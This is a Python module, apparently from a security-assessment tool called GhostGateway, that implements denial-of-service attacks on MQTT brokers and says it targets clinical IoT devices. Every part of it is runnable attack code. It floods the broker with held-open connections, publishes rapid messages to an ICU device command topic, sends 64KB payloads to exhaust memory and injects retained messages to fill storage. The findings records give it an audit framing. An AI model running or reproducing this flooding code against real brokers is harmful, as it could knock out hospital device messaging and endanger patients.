"""
GhostGateway - MQTT DoS Module
Connection flooding, message flooding, large payload flood,
retained message abuse targeting clinical IoT MQTT brokers.
"""

import time
import threading
import random
import string
import paho.mqtt.client as mqtt
from utils.logger import get_logger

logger = get_logger("MQTT-DoS")


class MQTTDoS:
    def __init__(self, broker, port=1883, verbose=False):
        self.broker = broker
        self.port = port
        self.verbose = verbose
        self.findings = []
        self._stop_event = threading.Event()
        self._request_count = 0
        self._lock = threading.Lock()

    def _connection_flood_worker(self):
        """Open many MQTT connections and hold them open"""
        connections = []
        while not self._stop_event.is_set():
            try:
                cid = "ghost_" + "".join(random.choices(string.ascii_lowercase, k=6))
                client = mqtt.Client(client_id=cid)
                client.connect(self.broker, self.port, keepalive=60)
                client.loop_start()
                connections.append(client)
                with self._lock:
                    self._request_count += 1
                time.sleep(0.05)
            except Exception:
                break
        for c in connections:
            try:
                c.loop_stop()
                c.disconnect()
            except Exception:
                pass

    def _message_flood_worker(self, topic="ward/icu/device/command"):
        """Rapidly publish messages to a topic"""
        try:
            client = mqtt.Client(client_id="ghost_flood_" + "".join(
                random.choices(string.ascii_lowercase, k=4)))
            client.connect(self.broker, self.port, keepalive=30)
            client.loop_start()
            while not self._stop_event.is_set():
                payload = "GHOSTGATEWAY_FLOOD_" + "".join(
                    random.choices(string.ascii_letters, k=20))
                client.publish(topic, payload, qos=0)
                with self._lock:
                    self._request_count += 1
            client.loop_stop()
            client.disconnect()
        except Exception:
            pass

    def _large_payload_worker(self, topic="ward/device/data"):
        """Send oversized payloads to stress broker memory"""
        try:
            client = mqtt.Client(client_id="ghost_large_" + "".join(
                random.choices(string.ascii_lowercase, k=4)))
            client.connect(self.broker, self.port, keepalive=30)
            client.loop_start()
            while not self._stop_event.is_set():
                payload = "X" * 65535  # 64KB payload
                client.publish(topic, payload, qos=0)
                with self._lock:
                    self._request_count += 1
                time.sleep(0.1)
            client.loop_stop()
            client.disconnect()
        except Exception:
            pass

    def connection_flood(self, duration=10, threads=20):
        logger.info(f"[DoS] MQTT Connection Flood: {threads} threads for {duration}s")
        self._stop_event.clear()
        self._request_count = 0
        workers = [threading.Thread(target=self._connection_flood_worker)
                   for _ in range(threads)]
        for w in workers:
            w.daemon = True
            w.start()
        time.sleep(duration)
        self._stop_event.set()
        for w in workers:
            w.join(timeout=2)
        logger.info(f"  [+] ~{self._request_count} MQTT connections attempted.")
        self.findings.append({
            "check": "MQTT Connection Flood",
            "severity": "HIGH",
            "detail": f"~{self._request_count} concurrent MQTT connections attempted in {duration}s"
        })

    def message_flood(self, duration=10, threads=5):
        logger.info(f"[DoS] MQTT Message Flood: {threads} threads for {duration}s")
        self._stop_event.clear()
        self._request_count = 0
        workers = [threading.Thread(target=self._message_flood_worker)
                   for _ in range(threads)]
        for w in workers:
            w.daemon = True
            w.start()
        time.sleep(duration)
        self._stop_event.set()
        for w in workers:
            w.join(timeout=2)
        logger.info(f"  [+] ~{self._request_count} MQTT messages published.")
        self.findings.append({
            "check": "MQTT Message Flood",
            "severity": "HIGH",
            "detail": f"~{self._request_count} rapid messages flooded broker in {duration}s"
        })

    def large_payload_flood(self, duration=5):
        logger.info(f"[DoS] MQTT Large Payload Attack for {duration}s")
        self._stop_event.clear()
        self._request_count = 0
        w = threading.Thread(target=self._large_payload_worker)
        w.daemon = True
        w.start()
        time.sleep(duration)
        self._stop_event.set()
        w.join(timeout=2)
        logger.info(f"  [+] ~{self._request_count} large (64KB) payloads sent.")
        self.findings.append({
            "check": "Large Payload Flood",
            "severity": "MEDIUM",
            "detail": f"~{self._request_count} oversized (64KB) MQTT messages sent in {duration}s"
        })

    def retained_message_abuse(self):
        """Fill broker with retained messages to exhaust storage"""
        logger.info("[DoS] Retained Message Abuse...")
        try:
            client = mqtt.Client(client_id="ghost_retained")
            client.connect(self.broker, self.port, keepalive=10)
            client.loop_start()
            count = 0
            for i in range(100):
                topic = f"ghostgateway/flood/retained/{i}"
                client.publish(topic, f"GHOST_RETAINED_{i}" * 100, qos=1, retain=True)
                count += 1
            client.loop_stop()
            client.disconnect()
            logger.info(f"  [+] {count} retained messages injected.")
            self.findings.append({
                "check": "Retained Message Abuse",
                "severity": "MEDIUM",
                "detail": f"{count} retained messages published to fill broker storage"
            })
        except Exception as e:
            logger.warning(f"[DoS] Retained abuse failed: {e}")

    def run(self, duration=10, threads=10):
        logger.info("=" * 50)
        logger.info("  MQTT DoS MODULE - GhostGateway")
        logger.info("=" * 50)
        self.connection_flood(duration=duration // 3, threads=threads)
        self.message_flood(duration=duration // 3, threads=threads // 2)
        self.large_payload_flood(duration=duration // 3)
        self.retained_message_abuse()
        logger.info(f"[DoS] Complete. {len(self.findings)} findings.")
        return self.findings
